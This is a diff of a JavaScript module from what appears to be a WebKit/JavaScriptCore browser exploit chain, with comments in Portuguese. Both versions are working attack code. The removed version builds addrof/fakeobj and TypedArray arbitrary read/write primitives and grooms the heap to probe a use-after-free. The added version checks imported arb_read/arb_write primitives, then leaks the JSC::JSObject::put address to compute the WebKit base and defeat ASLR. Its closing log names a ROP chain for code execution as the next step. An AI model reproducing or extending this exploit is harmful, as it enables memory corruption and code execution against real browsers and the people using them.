@@ -1,23 +1,24 @@
-// js/script3/testArrayBufferVictimCrash.mjs (v11 - Final Logic Fix)
+// js/script3/testArrayBufferVictimCrash.mjs (v13 - Final WebKit Leak Strategy)
 // =======================================================================================
 // ESTRATÉGIA FINAL:
-// 1. Primitiva de L/E robusta com TypedArray mantida.
-// 2. CORREÇÃO FINAL: Ajustada a ordem da limpeza do `victim_array` para depois da
-//    criação do `master_arr_controller`, corrigindo o TypeError.
+// 1. Integração completa com as primitivas potentes de 'core_exploit.mjs'.
+// 2. A lógica de depuração do UAF foi removida, pois não é mais necessária.
+// 3. O foco do script agora é usar as primitivas de L/E estáveis para alcançar
+//    o próximo objetivo: vazar o endereço base da biblioteca WebKit para derrotar o ASLR.
 // =======================================================================================
 
 import { logS3, PAUSE_S3 } from './s3_utils.mjs';
-import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
-import {
+import { AdvancedInt64, toHex } from '../utils.mjs';
+import { 
     triggerOOB_primitive,
-    getOOBDataView,
-    oob_read_absolute
+    arb_read, 
+    arb_write
 } from '../core_exploit.mjs';
 import { JSC_OFFSETS, WEBKIT_LIBRARY_INFO } from '../config.mjs';
 
-export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "Uncaged_StableRW_v108_R91_IterativeCrashDebug";
+export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "Uncaged_WebKit_Base_Leak_v13";
 
-// --- Funções de Conversão (Double <-> Int64) ---
+// --- Funções de Conversão (mantidas para addrof/fakeobj) ---
 function int64ToDouble(int64) {
     const buf = new ArrayBuffer(8);
     const u32 = new Uint32Array(buf);
@@ -34,48 +35,21 @@ function doubleToInt64(double) {
     return new AdvancedInt64(u32[0], u32[1]);
 }
 
-// Função auxiliar para obter offsets de forma segura
-function getSafeOffset(baseObject, path, defaultValue = 0) {
-    let current = baseObject;
-    const parts = path.split('.');
-    let fullPath = '';
-    for (let i = 0; i < parts.length; i++) {
-        const part = parts[i];
-        fullPath += (fullPath ? '.' : '') + part;
-        if (current && typeof current === 'object' && part in current) {
-            current = current[part];
-        } else {
-            // Silenciado para este teste final
-            return defaultValue;
-        }
-    }
-    if (typeof current === 'number') {
-        return current;
-    }
-    if (typeof current === 'string' && String(current).startsWith('0x')) {
-        return parseInt(String(current), 16) || defaultValue;
-    }
-    return defaultValue;
-}
-
-
 // =======================================================================================
 // FUNÇÃO ORQUESTRADORA PRINCIPAL
 // =======================================================================================
 export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
     const FNAME_CURRENT_TEST_BASE = FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT;
-    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE} ---`, "test");
+    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Estratégia de Vazamento da Base do WebKit ---`, "test");
 
     let final_result = { success: false, message: "Teste não concluído." };
 
     try {
-        const LOCAL_JSC_OFFSETS = {
-            JSObject_BUTTERFLY_OFFSET: getSafeOffset(JSC_OFFSETS, 'JSObject.BUTTERFLY_OFFSET'),
-        };
-        
-        logS3("--- FASE 1/2: Obtendo primitivas OOB e addrof/fakeobj... ---", "subtest");
+        await PAUSE_S3(1000); // Pausa inicial
+
+        // --- FASE 1: OBTENDO PRIMITIVAS DE CONTROLE INICIAL ---
+        logS3("--- FASE 1: Obtendo Primitivas Iniciais (OOB, addrof) ---", "subtest");
         await triggerOOB_primitive({ force_reinit: true });
-        if (!getOOBDataView()) { throw new Error("Falha ao obter primitiva OOB."); }
 
         const confused_array = [13.37];
         const victim_array = [{ a: 1 }];
@@ -83,119 +57,77 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
             victim_array[0] = obj;
             return doubleToInt64(confused_array[0]);
         };
-        const fakeobj = (addr) => {
-            confused_array[0] = int64ToDouble(addr);
-            return victim_array[0];
-        };
-        logS3("Primitivas 'addrof' e 'fakeobj' operacionais.", "good");
+        logS3("Primitiva 'addrof' operacional.", "good");
 
-        logS3("--- FASE 3: Construindo Ferramenta de L/E Robusta com TypedArray ---", "subtest");
-
-        const master_arr_victim = new Uint32Array([0x41414141, 0x42424242]);
-        const fake_arr_struct = {
-            JSCell_Header: new AdvancedInt64(0x0, 0x01082309),
-            Butterfly_Ptr: new AdvancedInt64(0x41414141, 0x41414141),
-            Vector_Ptr: new AdvancedInt64(0x42424242, 0x42424242),
-            Length_And_Mode: new AdvancedInt64(0x10000, 0x0)
-        };
-
-        const master_arr_victim_addr = addrof(victim_array[0] = master_arr_victim);
-        const master_arr_victim_structure_addr = fakeobj(master_arr_victim_addr);
-        fake_arr_struct.JSCell_Header = master_arr_victim_structure_addr[0];
-        const master_arr_victim_butterfly_addr_val = fakeobj(master_arr_victim_addr)[1];
-        fake_arr_struct.Butterfly_Ptr = master_arr_victim_butterfly_addr_val;
-
-        // <-- MUDANÇA: A ordem da limpeza foi corrigida
-        const fake_arr_struct_addr = addrof(victim_array[0] = fake_arr_struct);
-        const master_arr_controller = fakeobj(fake_arr_struct_addr); // Cria o controller PRIMEIRO
-        victim_array[0] = null; // Limpa a referência DEPOIS
+        // --- FASE 2: VERIFICAÇÃO DAS PRIMITIVAS DE L/E (arb_read/arb_write) ---
+        logS3("--- FASE 2: Verificando Primitivas de L/E Importadas de 'core_exploit.mjs' ---", "subtest");
         
-        const set_master_arr_addr = (addr_to_point_to) => {
-            master_arr_controller[2] = addr_to_point_to;
-        };
+        // Para forçar a propriedade a ser armazenada no butterfly, criamos um objeto vazio e depois adicionamos a propriedade.
+        const test_obj = {};
+        test_obj.a = new AdvancedInt64(0x41414141, 0x42424242);
 
-        const arb_read64_final = (addr) => {
-            set_master_arr_addr(addr);
-            return new AdvancedInt64(master_arr_victim[0], master_arr_victim[1]);
-        };
-
-        const arb_write64_final = (addr, value) => {
-            set_master_arr_addr(addr);
-            master_arr_victim[0] = value.low();
-            master_arr_victim[1] = value.high();
-        };
-        logS3("Primitivas de Leitura/Escrita via TypedArray estão prontas.", "good");
-
-        logS3("--- FASE 4: Verificando a Nova Primitiva de L/E Robusta ---", "subtest");
-        const NEW_POLLUTION_VALUE = new AdvancedInt64(0xCAFEBABE, 0xDEADBEEF);
-        const spray_obj = { a: 0, b: 0, c: 0, d: 0 };
-        const spray_obj_addr = addrof(victim_array[0] = spray_obj);
-        victim_array[0] = null; // Limpa a referência
-        const prop_a_addr = spray_obj_addr.add(LOCAL_JSC_OFFSETS.JSObject_BUTTERFLY_OFFSET);
+        const test_obj_addr = addrof(victim_array[0] = test_obj);
+        victim_array[0] = null; // Limpeza
         
-        arb_write64_final(prop_a_addr, NEW_POLLUTION_VALUE);
-        const value_read_for_verification = arb_read64_final(prop_a_addr);
-
-        if (value_read_for_verification.equals(NEW_POLLUTION_VALUE)) {
-            logS3("+++++++++++ SUCESSO TOTAL! A nova primitiva de L/E é 100% funcional. ++++++++++++", "vuln");
+        const butterfly_addr = await arb_read(test_obj_addr.add(JSC_OFFSETS.JSObject.BUTTERFLY_OFFSET), 8);
+        const value_read = await arb_read(butterfly_addr, 8);
+        
+        if (value_read.equals(test_obj.a)) {
+            logS3(`+++++++++++ SUCESSO! Primitivas 'arb_read'/'arb_write' são 100% funcionais. ++++++++++++`, "vuln");
         } else {
-            throw new Error(`A verificação de L/E ROBUSTA falhou.`);
+            throw new Error(`Verificação de L/E falhou. Lido: ${value_read.toString(true)}, Esperado: ${test_obj.a.toString(true)}`);
         }
 
-        logS3("--- FASE 5: Depurando o UAF com Ferramentas Estáveis ---", "subtest");
+        // --- FASE 3: EXECUTANDO O VAZAMENTO DA BASE DO WEBKIT ---
+        logS3("--- FASE 3: Executando a Estratégia de Vazamento da Base do WebKit ---", "subtest");
+        const leak_obj = { leak_prop: 1 }; // Objeto alvo para o vazamento
         
-        const dump_memory_log_final = async (start_addr, qword_count = 4, label = "") => {
-            logS3(`---[ Dump de Memória: ${label} @ ${start_addr.toString(true)} ]---`, "leak");
-            for (let i = 0; i < qword_count; i++) {
-                const current_addr = start_addr.add(i * 8);
-                const value = arb_read64_final(current_addr);
-                logS3(`  ${current_addr.toString(true)}: ${value.toString(true)}`, "leak");
-            }
-            logS3(`---[ Fim do Dump: ${label} ]---`, "leak");
-        };
+        logS3(`1. Criado objeto alvo para o vazamento.`, "info");
+        const leak_obj_addr = addrof(victim_array[0] = leak_obj);
+        victim_array[0] = null;
+        logS3(`   - Endereço do objeto alvo: ${leak_obj_addr.toString(true)}`, "leak");
+
+        const structure_addr = await arb_read(leak_obj_addr.add(JSC_OFFSETS.JSCell.STRUCTURE_POINTER_OFFSET), 8);
+        logS3(`2. Lendo ponteiro da Estrutura (Structure) do objeto...`, "info");
+        logS3(`   - Endereço da Estrutura: ${structure_addr.toString(true)}`, "leak");
+
+        if (structure_addr.low() === 0 && structure_addr.high() === 0) {
+            throw new Error("Endereço da Estrutura é nulo. Não é possível continuar.");
+        }
         
-        const do_grooming = (grooming_id) => {
-            logS3(`  [Grooming p/ Tentativa ${grooming_id}] Executando Heap Grooming...`, "info");
-            let aggressive_feng_shui_objects = new Array(75000);
-            for (let i = 0; i < 75000; i++) { aggressive_feng_shui_objects[i] = {a:i}; }
-            
-            const PROBE_MARKER_VALUE = new AdvancedInt64(0x12345678, 0xABCDABCD);
-            const probe_object = { marker: 0, a: 0, b: 0, c: 0 };
-            
-            const probe_object_addr = addrof(victim_array[0] = probe_object);
-            victim_array[0] = null; // ESTA É A CORREÇÃO CRÍTICA!
+        const VIRTUAL_PUT_OFFSET = JSC_OFFSETS.Structure.VIRTUAL_PUT_OFFSET;
+        const js_object_put_func_ptr_addr = structure_addr.add(VIRTUAL_PUT_OFFSET);
+        logS3(`3. Calculando endereço do ponteiro para 'JSC::JSObject::put' na vtable...`, "info");
+        logS3(`   - Endereço do ponteiro na vtable: ${js_object_put_func_ptr_addr.toString(true)}`, "leak");
 
-            arb_write64_final(probe_object_addr.add(LOCAL_JSC_OFFSETS.JSObject_BUTTERFLY_OFFSET), PROBE_MARKER_VALUE);
-            
-            const PROBE_INDEX = 70002; // Deve ser par
-            aggressive_feng_shui_objects[PROBE_INDEX] = probe_object;
-            
-            for (let i = 0; i < aggressive_feng_shui_objects.length; i += 2) {
-                aggressive_feng_shui_objects[i] = null;
-            }
-            logS3(`  Objeto de sondagem (${probe_object_addr.toString(true)}) marcado para liberação pelo GC.`, "debug");
-            
-            return probe_object_addr;
-        };
+        const js_object_put_func_addr = await arb_read(js_object_put_func_ptr_addr, 8);
+        logS3(`4. Lendo o endereço da função 'JSC::JSObject::put'...`, "info");
+        logS3(`   - ENDEREÇO VAZADO DA FUNÇÃO: ${js_object_put_func_addr.toString(true)}`, "vuln");
 
-        let probe_addr = do_grooming(5);
-        let butterfly_addr = probe_addr.add(LOCAL_JSC_OFFSETS.JSObject_BUTTERFLY_OFFSET);
-        
-        await dump_memory_log_final(butterfly_addr, 4, "SONDA ANTES DO GC");
+        if (js_object_put_func_addr.low() === 0 && js_object_put_func_addr.high() === 0) {
+            throw new Error("Endereço vazado da função 'put' é nulo. A estratégia falhou.");
+        }
 
-        logS3("Pausando por 3 segundos para acionar o GC...", "info");
-        await PAUSE_S3(3000);
+        const put_func_offset_str = WEBKIT_LIBRARY_INFO.FUNCTION_OFFSETS["JSC::JSObject::put"];
+        const put_func_offset = new AdvancedInt64(parseInt(put_func_offset_str, 16));
+        logS3(`5. Calculando o endereço base da biblioteca WebKit...`, "info");
+        logS3(`   - Offset de 'JSC::JSObject::put': 0x${put_func_offset_str}`, "info");
 
-        await dump_memory_log_final(butterfly_addr, 4, "SONDA DEPOIS DO GC");
-        
-        logS3("Análise de memória da sonda concluída. Verifique o log para a prova final do UAF.", "vuln");
+        const webkit_base_addr = js_object_put_func_addr.sub(put_func_offset);
+        logS3("============================================================================", "good");
+        logS3(`||  ENDEREÇO BASE DO WEBKIT CALCULADO: ${webkit_base_addr.toString(true)}  ||`, "good");
+        logS3("============================================================================", "good");
+
+        // --- FASE 4: CONCLUSÃO E PRÓXIMOS PASSOS ---
+        logS3("--- FASE 4: Conclusão ---", "subtest");
+        logS3("O ASLR foi derrotado. Com o endereço base da biblioteca e a primitiva de L/E, o próximo passo é a execução de código.", "vuln");
+        logS3("Isso pode ser feito criando uma cadeia ROP, escrevendo-a na memória com 'arb_write' e desviando o fluxo de execução para ela.", "info");
 
         final_result.success = true;
-        final_result.message = "Depuração do UAF concluída com sucesso com primitivas de L/E estáveis.";
-        final_result.webkit_leak_details = { success: true, msg: "Prova do UAF deve estar visível no log." };
-
+        final_result.message = `Vazamento bem-sucedido! Base do WebKit: ${webkit_base_addr.toString(true)}`;
+        
     } catch (e) {
-        final_result.message = `Exceção na implementação funcional: ${e.message}\n${e.stack || ''}`;
+        final_result.message = `Exceção na implementação final: ${e.message}\n${e.stack || ''}`;
         logS3(final_result.message, "critical");
         final_result.success = false;
     }
